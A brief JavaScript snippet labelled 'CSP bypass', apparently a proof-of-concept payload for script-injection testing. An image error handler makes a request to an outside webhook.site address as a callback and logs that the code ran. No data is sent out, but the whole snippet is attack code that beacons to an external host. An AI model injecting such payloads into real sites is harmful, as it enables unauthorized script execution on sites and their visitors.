// CSP bypass
(function() {

    var img = new Image();
    img.src = 'x'; 
    img.onerror = function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://webhook.site/c63e44e1-fbc7-4e81-b8e1-c0729a501b14", true);
        xhr.send();
        
        console.log("chtipilou code executed");
    };
})();
